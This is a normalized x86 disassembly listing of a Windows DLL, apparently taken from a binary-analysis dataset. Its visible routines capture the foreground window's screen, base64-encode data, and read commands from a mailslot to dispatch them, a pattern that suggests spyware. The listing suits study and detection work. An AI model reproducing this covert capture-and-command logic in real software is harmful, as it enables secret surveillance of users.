pop ebx
mov esp ebp
pop ebp
retn 0xc
mov edi ebx
add ecx ecx
push ecx
push eax
push ebx
call sub_1000a7c0
mov ecx [ ebp + 0x10 ]
add esp 0xc
sub_100031df
mov esi [ ebp + 0x8 ]
cmp [ esi + 0x14 ] 0x8
jb r-xdata
xor ecx ecx
push ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
push ecx
mov [ esi ] cx
call sub_10009ef4
int3
mov eax [ esi ]
push eax
call sub_10008d40
add esp 0x4
sub_10003210
push ebp
mov ebp esp
sub esp 0x10
xor eax eax
test ecx ecx
je r-xdata
mov esp ebp
pop ebp
retn
cmp ecx 0x7fffffff
ja r-xdata
lea ecx [ ebp - 0x4 ]
push ecx
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] 0x0
call sub_10008c8d
push r--data
lea edx [ ebp - 0x10 ]
push edx
mov [ ebp - 0x10 ] r--data
call sub_10009ef4
lea eax [ ecx + ecx ]
push eax
call sub_10008d9c
add esp 0x4
test eax eax
jne r-xdata
sub_10003260
mov ecx eax
push esi
mov [ edi + 0x14 ] 0xf
mov [ edi + 0x10 ] 0x0
mov [ edi ] 0x0
lea esi [ ecx + 0x1 ]
mov dl [ ecx ]
inc ecx
test dl dl
jne r-xdata
sub ecx esi
mov esi ecx
mov ecx edi
call sub_10002000
mov eax edi
pop esi
retn
sub_10003290
mov eax [ rw-data ]
push edi
xor edi edi
cmp eax edi
je r-xdata
mov eax [ rw-data ]
push esi
mov esi [ rw-data ]
cmp esi edi
jbe r-xdata
dec eax
jne r-xdata
pop esi
cmp eax edi
je r-xdata
mov edi edi
cmp eax edi
jne r-xdata
mov [ rw-data ] edi
mov [ rw-data ] edi
mov [ rw-data ] edi
pop edi
retn
push eax
call sub_10008d40
add esp 0x4
cmp esi edi
ja r-xdata
mov eax [ eax + esi * 4 ]
push eax
call sub_10008d40
mov eax [ rw-data ]
add esp 0x4
mov [ rw-data ] eax
dec esi
cmp [ eax + esi * 4 ] edi
je r-xdata
sub_10003300
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
push eax
mov [ esi ] r--data
call [ GdipDisposeImage@IAT ]
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call [ GdipFree@IAT ]
sub_10003330
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
mov ecx [ esi + 0x4 ]
lea eax [ ebp - 0x4 ]
push eax
push ecx
mov [ ebp - 0x4 ] 0x0
call [ GdipCloneImage@IAT ]
test eax eax
je r-xdata
push 0x10
call [ GdipAlloc@IAT ]
test eax eax
je r-xdata
mov [ esi + 0x8 ] eax
xor eax eax
pop esi
mov esp ebp
pop ebp
retn
mov esi [ esi + 0x8 ]
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x8 ] esi
mov [ eax ] r--data
mov [ eax + 0x4 ] ecx
pop esi
mov esp ebp
pop ebp
retn
sub_100033b0
push ebp
mov ebp esp
sub esp 0x8
push esi
push edi
lea eax [ ebp - 0x8 ]
push eax
lea ecx [ ebp - 0x4 ]
xor edi edi
push ecx
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x8 ] edi
call [ GdipGetImageEncodersSize@IAT ]
mov esi [ ebp - 0x8 ]
cmp esi edi
jne r-xdata
push ebx
push esi
call sub_10009388
mov ebx eax
add esp 0x4
cmp ebx edi
jne r-xdata
pop edi
or eax 0xffffffff
pop esi
mov esp ebp
pop ebp
retn 0x4
mov edx [ ebp - 0x4 ]
push ebx
push esi
push edx
call [ GdipGetImageEncoders@IAT ]
xor esi esi
cmp [ ebp - 0x4 ] edi
jbe r-xdata
pop ebx
pop edi
or eax 0xffffffff
pop esi
mov esp ebp
pop ebp
retn 0x4
push ebx
call sub_10009181
add esp 0x4
pop ebx
pop edi
xor eax eax
pop esi
mov esp ebp
pop ebp
retn 0x4
lea edi [ ebx + 0x30 ]
sbb eax eax
sbb eax 0xffffffff
test dx dx
je r-xdata
mov ecx [ ebp + 0x8 ]
mov eax esi
imul eax eax 0x4c
mov edx [ eax + ebx ]
add eax ebx
mov [ ecx ] edx
mov edx [ eax + 0x4 ]
mov [ ecx + 0x4 ] edx
mov edx [ eax + 0x8 ]
mov [ ecx + 0x8 ] edx
mov eax [ eax + 0xc ]
push ebx
mov [ ecx + 0xc ] eax
call sub_10009181
add esp 0x4
pop ebx
pop edi
mov eax esi
pop esi
mov esp ebp
pop ebp
retn 0x4
inc esi
add edi 0x4c
cmp esi [ ebp - 0x4 ]
jb r-xdata
xor eax eax
jmp r-xdata
mov dx [ eax + 0x2 ]
cmp dx [ ecx + 0x2 ]
jne r-xdata
mov eax [ edi ]
mov ecx r--data
lea esp [ esp ]
test eax eax
je r-xdata
add eax 0x4
add ecx 0x4
test dx dx
jne r-xdata
mov dx [ eax ]
cmp dx [ ecx ]
jne r-xdata
sub_100034b0
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_10011b18
mov eax [ fs : 0x0 ]
push eax
sub esp 0x88
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x80 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x98 ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
push 0x0
mov [ esp + 0x2c ] eax
mov [ esp + 0x20 ] ecx
mov [ esp + 0x28 ] 0x28
call [ GetDC@IAT ]
mov esi eax
call [ GetForegroundWindow@IAT ]
cmp [ ebp + 0xc ] 0x0
mov [ esp + 0x18 ] eax
jne r-xdata
lea edx [ esp + 0x50 ]
push edx
push eax
call [ GetWindowRect@IAT ]
mov eax [ esp + 0x18 ]
mov edi [ esp + 0x58 ]
mov ebx [ esp + 0x5c ]
sub edi [ esp + 0x50 ]
sub ebx [ esp + 0x54 ]
push eax
call [ GetWindowDC@IAT ]
mov ecx [ esp + 0x5c ]
sub ecx [ esp + 0x54 ]
mov edx [ esp + 0x58 ]
sub edx [ esp + 0x50 ]
push ecx
mov esi eax
push edx
mov edi [ GetDeviceCaps@IAT ]
push 0xa
push esi
call edi
push 0x8
push esi
mov ebx eax
call edi
mov edi eax
push ebx
push edi
jmp r-xdata
mov ecx [ esp + 0x20 ]
push ecx
push edi
call [ SelectObject@IAT ]
push edi
mov edi [ DeleteObject@IAT ]
call edi
mov edx [ esp + 0x18 ]
push edx
call edi
push esi
push 0x0
call [ ReleaseDC@IAT ]
push ebx
call [ GdipDisposeImage@IAT ]
mov al 0x1
mov ecx [ esp + 0x98 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x80 ]
xor ecx esp
call sub_10008bf6
mov esp ebp
pop ebp
retn 0x8
mov edx [ esp + 0x10 ]
lea eax [ esp + 0x60 ]
push eax
lea ecx [ esp + 0x84 ]
push ecx
push edx
push ebx
call [ GdipSaveImageToStream@IAT ]
test eax eax
je r-xdata
push esi
call [ CreateCompatibleBitmap@IAT ]
push esi
call [ CreateCompatibleDC@IAT ]
push ebx
push edi
push esi
mov [ esp + 0x20 ] eax
call [ CreateCompatibleBitmap@IAT ]
push eax
mov [ esp + 0x1c ] eax
mov eax [ esp + 0x18 ]
push eax
call [ SelectObject@IAT ]
push 0xcc0020
push 0x0
push 0x0
push esi
push ebx
push edi
mov edi [ esp + 0x2c ]
push 0x0
push 0x0
push edi
mov [ esp + 0x44 ] eax
call [ BitBlt@IAT ]
mov edx [ esp + 0x18 ]
lea ecx [ esp + 0x14 ]
push ecx
push 0x0
push edx
mov [ esp + 0x4c ] r--data
mov [ esp + 0x20 ] 0x0
call [ GdipCreateBitmapFromHBITMAP@IAT ]
mov ebx [ esp + 0x14 ]
mov [ esp + 0x48 ] eax
mov [ esp + 0x44 ] ebx
mov [ esp + 0xa0 ] 0x0
mov ecx [ r--data ]
mov edx [ r--data ]
mov [ esp + 0x64 ] ecx
mov ecx [ r--data ]
mov eax 0x1
mov [ esp + 0x6c ] ecx
mov [ esp + 0x60 ] eax
mov [ esp + 0x68 ] edx
mov edx [ r--data ]
mov [ esp + 0x74 ] eax
lea ecx [ esp + 0x80 ]
lea eax [ esp + 0x24 ]
push ecx
mov [ esp + 0x74 ] edx
mov [ esp + 0x7c ] 0x4
mov [ esp + 0x80 ] eax
call sub_100033b0
lea edx [ esp + 0x10 ]
push edx
push 0x1
push 0x0
call [ CreateStreamOnHGlobal@IAT ]
test eax eax
js r-xdata
mov ecx [ esp + 0x10 ]
mov edx [ ecx ]
xor eax eax
lea ecx [ esp + 0x34 ]
push ecx
push 0x2
mov ecx eax
push ecx
mov ecx [ edx + 0x14 ]
push eax
mov [ esp + 0x40 ] eax
mov eax [ esp + 0x20 ]
push eax
call ecx
test eax eax
js r-xdata
mov [ esp + 0x48 ] eax
jmp r-xdata
mov eax [ esp + 0x10 ]
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
mov ecx [ esp + 0x10 ]
mov edx [ ecx ]
xor eax eax
push eax
push eax
push eax
push eax
mov [ esp + 0x40 ] eax
mov eax [ edx + 0x14 ]
push ecx
call eax
test eax eax
js r-xdata
mov eax [ esp + 0x34 ]
mov ecx [ esp + 0x1c ]
push eax
mov [ ecx ] eax
call sub_10009388
mov edx [ esp + 0x2c ]
add esp 0x4
mov [ edx ] eax
test eax eax
je r-xdata
mov ecx [ esp + 0x10 ]
mov edx [ ecx ]
mov ecx [ esp + 0x1c ]
mov ecx [ ecx ]
push 0x0
push ecx
mov ecx [ edx + 0xc ]
push eax
mov eax [ esp + 0x1c ]
push eax
call ecx
sub_10003760
push ebp
mov ebp esp
sub esp 0x1c
mov eax [ ebp + 0xc ]
push ebx
push esi
push edi
lea ebx [ eax + eax + 0x8000 ]
push 0x4
and ebx 0xffff8000
add ebx 0x8000
push 0x3000
lea ecx [ ebx + 0x40 ]
push ecx
xor edi edi
xor esi esi
push edi
mov [ ebp - 0x8 ] esi
call [ VirtualAlloc@IAT ]
mov [ ebp - 0x10 ] eax
test eax eax
jne r-xdata
add ebx eax
mov [ ebp - 0x1 ] 0x61
mov ecx ebx
mov [ ebp - 0xc ] 0x1a
lea esp [ esp ]
mov edx [ ebp + 0x8 ]
pop edi
pop esi
mov [ edx ] al
pop ebx
mov esp ebp
pop ebp
retn 0x8
movzx edx [ ebp - 0x1 ]
sub dl 0x20
mov [ ecx ] dl
mov dl [ ebp - 0x1 ]
mov [ ecx + 0x1a ] dl
inc dl
inc ecx
dec [ ebp - 0xc ]
mov [ ebp - 0x1 ] dl
jne r-xdata
xor dl dl
mov [ ebp - 0x1 ] dl
lea ecx [ ebx + 0x34 ]
add dl 0x30
mov [ ecx ] dl
mov dl [ ebp - 0x1 ]
inc dl
inc ecx
mov [ ebp - 0x1 ] dl
cmp dl 0xa
jb r-xdata
mov ecx [ ebp + 0xc ]
mov [ ebx + 0x3e ] 0x2f2b
cmp ecx 0x3
jb r-xdata
test ecx ecx
je r-xdata
lea esi [ eax + 0x2 ]
mov edx eax
mov ecx eax
sub eax esi
sub edx esi
inc edx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] edx
mov eax 0xaaaaaaab
mul [ ebp + 0xc ]
sub ecx esi
add ecx 0x3
shr edx 0x1
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0xc ] edx
mov edi edi
mov edi [ ebp + 0x8 ]
push esi
push eax
push edi
mov [ eax + esi ] 0x0
call sub_10008e20
mov edx [ ebp - 0x10 ]
add esp 0xc
push 0x8000
push 0x0
push edx
mov [ esi + edi ] 0x0
call [ VirtualFree@IAT ]
pop edi
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
cmp ecx 0x1
jbe r-xdata
dec [ ebp - 0xc ]
jne r-xdata
push 0xa
call [ Sleep@IAT ]
mov ecx [ ebp + 0x8 ]
movzx ecx [ edi + ecx ]
shl ecx 0x10
mov edx [ ebp + 0x8 ]
movzx ecx [ edi + edx + 0x1 ]
movzx edx [ edi + edx ]
shl edx 0x8
add ecx edx
shl ecx 0x8
jmp r-xdata
mov edx [ ebp + 0x8 ]
movzx eax [ edi + edx ]
movzx ecx [ edi + edx + 0x1 ]
shl eax 0x8
xor ecx eax
movzx eax [ edi + edx + 0x2 ]
shl ecx 0x8
xor eax ecx
mov ecx eax
sub [ ebp + 0xc ] 0x3
and ecx 0x3f
mov dl [ ecx + ebx ]
mov ecx [ ebp - 0x14 ]
mov [ ecx + esi ] dl
shr eax 0x6
mov edx eax
shr eax 0x6
and edx 0x3f
movzx ecx [ edx + ebx ]
mov edx eax
mov [ esi ] cl
and edx 0x3f
movzx ecx [ edx + ebx ]
mov edx [ ebp - 0x18 ]
shr eax 0x6
and eax 0x3f
mov [ edx + esi ] cl
mov al [ eax + ebx ]
mov ecx [ ebp - 0x1c ]
mov [ ecx + esi ] al
mov eax [ ebp - 0x8 ]
add eax 0x4
add edi 0x3
add esi 0x4
mov [ ebp - 0x8 ] eax
test eax 0x3ffff
jne r-xdata
mov esi [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
mov ecx [ ebp + 0xc ]
add esi 0x4
mov [ eax + esi + 0x2 ] 0x3d
mov edx ecx
and edx 0x3f
movzx edx [ edx + ebx ]
mov [ eax + esi + 0x3 ] dl
shr ecx 0x6
mov edx ecx
and edx 0x3f
movzx edx [ edx + ebx ]
shr ecx 0x6
mov [ eax + esi + 0x2 ] dl
mov edx ecx
and edx 0x3f
movzx edx [ edx + ebx ]
shr ecx 0x6
and ecx 0x3f
cmp [ ebp + 0xc ] 0x1
mov [ eax + esi + 0x1 ] dl
mov cl [ ecx + ebx ]
mov [ eax + esi ] cl
mov [ eax + esi + 0x3 ] 0x3d
jne r-xdata
sub_10003960
push ebp
mov ebp esp
push 0xffffffff
push sub_10011c6c
mov eax [ fs : 0x0 ]
push eax
sub esp 0x20
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi [ ebp + 0x8 ]
lea eax [ edi + 0x4 ]
xor ebx ebx
mov [ edi ] r--data
push ebx
push eax
mov [ eax ] 0x1
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] ebx
mov [ eax + 0xc ] ebx
add eax 0x10
push eax
call [ GdiplusStartup@IAT ]
mov [ ebp - 0x4 ] ebx
lea esi [ edi + 0x30 ]
push 0x8
mov [ esi ] ebx
call sub_10008d9c
add esp 0x4
cmp eax ebx
je r-xdata
lea ecx [ ebp - 0x14 ]
push ecx
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x14 ] ebx
call sub_10008c8d
push r--data
lea edx [ ebp - 0x2c ]
push edx
mov [ ebp - 0x2c ] r--data
call sub_10009ef4
int3
mov [ esi ] eax
xor ecx ecx
mov [ eax ] ecx
xor edx edx
mov [ eax + 0x4 ] edx
mov eax [ esi ]
mov [ eax ] esi
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
mov [ esi + 0x10 ] ebx
mov [ ebp - 0x4 ] 0x1
lea esi [ edi + 0x48 ]
push 0x8
mov [ esi ] ebx
call sub_10008d9c
add esp 0x4
cmp eax ebx
je r-xdata
lea edx [ ebp - 0x10 ]
push edx
lea ecx [ ebp - 0x20 ]
mov [ ebp - 0x10 ] ebx
call sub_10008c8d
push r--data
lea eax [ ebp - 0x20 ]
push eax
mov [ ebp - 0x20 ] r--data
call sub_10009ef4
mov [ esi ] eax
xor ecx ecx
mov [ eax ] ecx
xor edx edx
mov [ eax + 0x4 ] edx
mov ecx [ esi ]
mov [ ecx ] esi
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
mov [ esi + 0x10 ] ebx
lea ecx [ edi + 0x64 ]
mov [ ebp - 0x4 ] 0x2
call sub_10008b73
mov [ ebp - 0x4 ] 0x3
push 0x24
mov [ edi + 0x18 ] 0xc800
mov [ edi + 0x1c ] ebx
mov [ edi + 0x20 ] ebx
mov [ edi + 0x24 ] ebx
call sub_10008d9c
add esp 0x4
cmp eax ebx
je r-xdata
xor eax eax
mov [ eax + 0x18 ] 0xf
mov [ eax + 0x14 ] ebx
mov [ eax + 0x4 ] bl
jmp r-xdata
mov [ edi + 0x60 ] eax
mov edx 0x1001
mov [ eax ] dx
mov ecx [ edi + 0x60 ]
add ecx 0x4
mov esi 0x6
mov eax r--data
call sub_10002000
mov eax [ edi + 0x60 ]
mov [ eax + 0x20 ] 0x1
mov ecx [ edi + 0x60 ]
mov [ ecx + 0x21 ] bl
mov [ edi + 0x28 ] bl
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_10003af0
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push edi
xor edi edi
push 0x2
push 0x104
mov ebx ecx
mov [ ebp - 0x10 ] edi
mov [ ebp - 0xc ] edi
mov [ ebp - 0x4 ] edi
call sub_100091bb
add esp 0x8
push edi
push 0xffffffff
push edi
mov esi eax
push rw-data
mov [ ebp - 0x8 ] esi
call [ CreateMailslotW@IAT ]
mov edi eax
mov [ ebp - 0x14 ] edi
cmp edi 0xffffffff
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x14
call [ Sleep@IAT ]
push 0x0
lea eax [ ebp - 0xc ]
push eax
lea ecx [ ebp - 0x10 ]
push ecx
push 0x0
push edi
call [ GetMailslotInfo@IAT ]
cmp [ ebp - 0xc ] 0x0
je r-xdata
push 0x14
call [ Sleep@IAT ]
mov eax ebx
call sub_10003fb0
jmp r-xdata
push 0x104
push 0x0
push esi
call sub_1000a740
mov eax [ ebp - 0x10 ]
add esp 0xc
push 0x0
lea edx [ ebp - 0x4 ]
push edx
push eax
push esi
push edi
mov [ ebp - 0x4 ] 0x0
call [ ReadFile@IAT ]
push 0x6
push r--data
push esi
call sub_10009b24
add esp 0xc
test eax eax
jne r-xdata
mov edi [ ebp - 0x4 ]
push 0x8
call sub_10008d9c
xor esi esi
add esp 0x4
cmp eax esi
je r-xdata
mov al 0x1
mov ecx ebx
call sub_10003e20
mov eax ebx
call sub_10003fb0
jmp r-xdata
push 0x1
push edi
mov [ ebp - 0x18 ] esi
call sub_100091bb
add esp 0x8
mov [ esi ] eax
test eax eax
je r-xdata
mov [ eax ] esi
mov [ eax + 0x4 ] esi
mov esi eax
push 0x8
call sub_10008d9c
xor esi esi
add esp 0x4
cmp eax esi
je r-xdata
mov ecx [ ebp - 0x8 ]
push edi
push ecx
push eax
call sub_1000a7c0
add esp 0xc
lea edx [ ebp - 0x18 ]
push edx
lea eax [ ebx + 0x30 ]
mov [ esi + 0x4 ] edi
call sub_10005630
add [ ebx + 0x1c ] edi
push 0x1
mov edi 0xb
push edi
mov [ ebp - 0x18 ] esi
call sub_100091bb
add esp 0x8
mov [ esi ] eax
test eax eax
je r-xdata
mov [ eax ] esi
mov [ eax + 0x4 ] esi
mov esi eax
mov esi [ ebp - 0x8 ]
mov edi [ ebp - 0x14 ]
mov eax ebx
call sub_10003fb0
jmp r-xdata
mov ecx [ r--data ]
mov [ eax ] ecx
mov edx [ r--data ]
mov [ eax + 0x4 ] edx
mov cx [ r--data ]
mov [ eax + 0x8 ] cx
mov dl [ r--data ]
mov [ eax + 0xa ] dl
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebx + 0x30 ]
mov [ esi + 0x4 ] edi
call sub_10005630
add [ ebx + 0x1c ] edi
sub_10003c90
push ebp
mov ebp esp
sub esp 0x1c
push esi
push edi
mov edi ecx
mov eax [ edi + 0x1c ]
xor esi esi
mov [ ebp - 0x8 ] eax
cmp eax [ edi + 0x18 ]
ja r-xdata
mov esi [ edi + 0x40 ]
push 0x1
push eax
call sub_100091bb
add esp 0x8
mov [ ebp - 0x10 ] eax
test eax eax
jne r-xdata
cmp [ edi + 0x28 ] 0x1
jne r-xdata
push ebx
mov ebx eax
test esi esi
je r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn
pop edi
mov eax esi
pop esi
mov esp ebp
pop ebp
retn
push 0x10
call sub_10008d9c
add esp 0x4
xor esi esi
pop ebx
cmp eax esi
je r-xdata
mov [ ebp - 0x4 ] esi
lea ebx [ ebx ]
mov edx [ edi ]
mov eax [ edx + 0xc ]
mov ecx edi
call eax
cmp [ esi + 0x8 ] 0x0
mov [ esi ] ax
mov [ esi + 0x2 ] 0x11
jne r-xdata
mov ecx 0xffff
mov [ eax + 0x4 ] esi
mov [ eax + 0x8 ] esi
mov [ eax + 0xc ] esi
mov [ eax ] cx
mov [ eax + 0x2 ] 0xff
mov esi eax
mov edx [ ecx ]
xor edx edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
sub [ edi + 0x1c ] eax
mov [ edi + 0x28 ] 0x0
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov [ esi + 0x8 ] ecx
mov [ esi + 0xc ] edx
mov edx [ edx + 0x4 ]
mov eax [ edx + eax * 4 ]
mov esi [ eax + ecx * 4 ]
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
push ecx
push edx
push ebx
call sub_1000a7c0
mov eax [ edi + 0x40 ]
add ebx [ esi + 0x4 ]
add esp 0xc
test eax eax
je r-xdata
sub eax esi
mov ecx [ eax + 0x8 ]
mov esi [ edx + 0x8 ]
mov eax ecx
shr eax 0x2
and ecx 0x3
cmp esi eax
ja r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
mov edx [ edi + 0x38 ]
inc [ edi + 0x3c ]
add edx edx
add edx edx
cmp edx [ edi + 0x3c ]
ja r-xdata
push esi
call sub_10008d40
add esp 0x4
dec [ ebp - 0x4 ]
jne r-xdata
push eax
call sub_10009181
add esp 0x4
dec eax
mov [ edi + 0x40 ] eax
jne r-xdata
mov [ edi + 0x3c ] 0x0
lea eax [ ebp - 0x1c ]
lea ecx [ edi + 0x30 ]
call sub_100056e0
mov ecx [ eax ]
test ecx ecx
jne r-xdata
mov [ edi + 0x3c ] 0x0
sub_10003dd0
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
xor al al
pop ebp
retn 0x4
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ecx + 0x48 ]
call sub_10005630
mov al 0x1
pop ebp
retn 0x4
sub_10003e20
push ebp
mov ebp esp
sub esp 0x8
push ebx
push edi
movzx eax al
mov ebx ecx
push eax
lea ecx [ ebp - 0x8 ]
xor edi edi
push ecx
lea ecx [ ebp - 0x4 ]
mov [ ebp - 0x8 ] edi
mov [ ebp - 0x4 ] edi
call sub_100034b0
cmp al 0x1
jne r-xdata
pop edi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x4 ]
lea eax [ edx + edx + 0x8000 ]
push esi
and eax 0xffff8000
add eax 0x8070
push 0x1
push eax
call sub_100091bb
mov esi eax
add esp 0x8
cmp esi edi
je r-xdata
pop esi
push r--data
mov edi 0x21
call sub_10003ed0
mov ecx [ ebp - 0x4 ]
mov edi [ ebp - 0x8 ]
push ecx
push edi
push esi
call sub_1000a7c0
push edi
call sub_10009181
mov edx [ ebp - 0x4 ]
add esp 0x10
push edx
push esi
call sub_10003760
push esi
mov edi eax
call sub_10003ed0
push r--data
mov edi 0x1d
call sub_10003ed0
push esi
call sub_10009181
add esp 0x4
sub_10003ed0
push ebp
mov ebp esp
push ecx
push esi
push 0x8
call sub_10008d9c
xor esi esi
add esp 0x4
cmp eax esi
je r-xdata
push 0x1
push edi
mov [ ebp - 0x4 ] esi
call sub_100091bb
add esp 0x8
mov [ esi ] eax
test eax eax
je r-xdata
mov [ eax ] esi
mov [ eax + 0x4 ] esi
mov esi eax
pop esi
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebp + 0x8 ]
push edi
push ecx
push eax
call sub_1000a7c0
add esp 0xc
lea edx [ ebp - 0x4 ]
push edx
lea eax [ ebx + 0x30 ]
mov [ esi + 0x4 ] edi
call sub_10005630
add [ ebx + 0x1c ] edi
sub_10003f30
push ebp
mov ebp esp
push 0xffffffff
push sub_10011aeb
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x1c
call sub_10008d9c
add esp 0x4
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor eax eax
push eax
call sub_10004210
jmp r-xdata
lea ecx [ esi + 0x24 ]
push ecx
push 0x0
push eax
push sub_100041f0
push 0x0
push 0x0
mov [ esi + 0x2c ] eax
call [ CreateThread@IAT ]
test eax eax
mov [ esi + 0x20 ] eax
setne al
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn
sub_10003fb0
push ebp
mov ebp esp
sub esp 0x1c
push ebx
mov ebx eax
cmp [ ebx + 0x58 ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
lea ecx [ ebx + 0x64 ]
push esi
mov [ ebp - 0x10 ] ecx
call sub_10008ba4
lea esi [ ebx + 0x48 ]
lea eax [ ebp - 0x1c ]
mov ecx esi
mov [ ebp - 0x4 ] esi
call sub_100056e0
mov ecx [ eax ]
test ecx ecx
jne r-xdata
mov edx [ ecx ]
xor edx edx
jmp r-xdata
mov edx [ edx + 0x4 ]
mov eax [ edx + eax * 4 ]
mov ecx [ eax + ecx * 4 ]
movzx eax [ ecx + 0x2 ]
dec eax
mov [ ebp - 0x8 ] ecx
cmp eax 0x6
ja r-xdata
sub eax edi
mov ecx [ eax + 0x8 ]
mov eax ecx
push edi
mov edi [ edx + 0x8 ]
shr eax 0x2
and ecx 0x3
cmp edi eax
ja r-xdata
push r--data
mov edi 0x2f
call sub_10003ed0
jmp r-xdata
jmp [ eax * 4 + jump_table_100041d4 ]
mov eax [ esi + 0x10 ]
xor edx edx
cmp eax edx
je r-xdata
mov esi ebx
call sub_10003f30
mov esi [ ebp - 0x4 ]
cmp al 0x1
je r-xdata
cmp [ ebx + 0x24 ] 0x0
je r-xdata
cmp [ ecx + 0xc ] 0x4
jne r-xdata
xor al al
mov ecx ebx
call sub_10003e20
mov [ ebx + 0x28 ] 0x1
jmp r-xdata
cmp [ ebx + 0x24 ] 0x0
je r-xdata
cmp [ ebx + 0x24 ] 0x0
je r-xdata
mov esi [ ebp - 0x8 ]
mov eax [ esi + 0x8 ]
pop edi
cmp eax edx
je r-xdata
mov edi [ esi + 0x8 ]
inc [ esi + 0xc ]
add edi edi
add edi edi
cmp edi [ esi + 0xc ]
ja r-xdata
mov ecx [ ebx + 0x20 ]
push 0x0
push ecx
call [ TerminateThread@IAT ]
mov edx [ ebx + 0x20 ]
push edx
call [ CloseHandle@IAT ]
mov edi [ ebx + 0x2c ]
test edi edi
je r-xdata
mov eax [ ecx + 0x8 ]
mov ecx [ eax ]
mov [ ebx + 0x18 ] ecx
jmp r-xdata
mov esi [ ecx + 0xc ]
cmp esi 0x104
jge r-xdata
mov esi [ ecx + 0xc ]
cmp esi 0x104
jge r-xdata
push esi
call sub_10008d40
mov ecx [ ebp - 0x10 ]
add esp 0x4
call sub_10008bad
pop esi
push eax
call sub_10009181
add esp 0x4
dec eax
mov [ esi + 0x10 ] eax
cmp eax edx
jne r-xdata
mov [ esi + 0xc ] edx
mov [ ebx + 0x20 ] 0x0
jmp r-xdata
push edi
call sub_10004310
push edi
call sub_10008d40
add esp 0x4
mov esi [ ebp - 0x4 ]
mov eax esi
cdq
sub eax edx
sar eax 0x1
inc eax
push 0x2
push eax
call sub_100091bb
mov edx [ ebp - 0x8 ]
mov edi [ edx + 0x8 ]
push esi
push edi
push eax
mov [ ebp - 0xc ] eax
call sub_1000a7c0
mov edx edi
mov edi [ ebx + 0x2c ]
add esp 0x14
call sub_10004dc0
mov edi 0x2e
test al al
jne r-xdata
mov eax esi
cdq
sub eax edx
sar eax 0x1
inc eax
push 0x2
push eax
call sub_100091bb
mov ecx [ ebp - 0x8 ]
mov edi [ ecx + 0x8 ]
push esi
push edi
push eax
mov [ ebp - 0xc ] eax
call sub_1000a7c0
mov edx edi
mov edi [ ebx + 0x2c ]
add esp 0x14
call sub_10004e70
test al al
jne r-xdata
mov [ esi + 0xc ] edx
push r--data
push r--data
jmp r-xdata
push r--data
mov edi 0x2e
call sub_10003ed0
mov edx [ ebp - 0xc ]
push edx
jmp r-xdata
push r--data
mov edi 0x31
call sub_10003ed0
mov edx [ ebp - 0xc ]
push edx
jmp r-xdata
call sub_10003ed0
mov eax [ ebp - 0xc ]
push eax
call sub_10009181
add esp 0x4
sub_10004210
push ebp
mov ebp esp
push 0xffffffff
push sub_10011ab6
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
xor edi edi
push 0xc
mov [ esi + 0x8 ] edi
call sub_10008d9c
add esp 0x4
cmp eax edi
je r-xdata
lea edx [ ebp - 0x10 ]
push edx
lea ecx [ ebp - 0x1c ]
mov [ ebp - 0x10 ] edi
call sub_10008c8d
push r--data
lea eax [ ebp - 0x1c ]
push eax
mov [ ebp - 0x1c ] r--data
call sub_10009ef4
int3
mov [ esi + 0x4 ] eax
mov [ eax ] eax
mov eax [ esi + 0x4 ]
mov [ eax + 0x4 ] eax
mov [ ebp - 0x4 ] edi
lea ecx [ esi + 0x14 ]
mov [ esi + 0x10 ] edi
call sub_10008b73
mov [ ebp - 0x4 ] 0x1
